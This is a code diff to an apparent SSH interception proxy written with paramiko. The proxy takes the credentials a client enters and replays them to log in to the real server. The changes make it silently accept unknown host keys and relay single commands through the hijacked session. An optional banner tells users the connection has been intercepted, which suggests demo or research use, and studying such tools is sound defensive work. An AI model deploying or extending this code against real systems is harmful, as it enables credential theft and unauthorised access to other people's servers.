@@ -192,10 +192,6 @@ if __name__ == '__main__':
                 continue
             ok('Authenticated!')
 
-            # if not server.event.is_set():
-            #warn('*** Client never asked for a shell.')
-            # t.close()
-            # continue
             if args.alerting:
                 chan.send(
                     '\r\n\033[31;1mThis connection has been intercepted\033[0m\r\n')
@@ -208,10 +204,17 @@ if __name__ == '__main__':
             remote.load_system_host_keys()
             remote.set_missing_host_key_policy(paramiko.WarningPolicy())
             try:
+                remote.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
                 remote.connect(
                     args.remote_server, args.remote_port, server.username, server.password)
             except paramiko.AuthenticationException as e:
                 chan.send("authentification failed\r\n")
+                chan.close()
+                continue
+            if server.command != "":
+                stdin, stdout, stderr = remote.exec_command(server.command)
+                chan.send(stdout.read())
+                chan.send(stderr.read())
                 chan.close()
                 continue
             remote_chan = remote.invoke_shell()
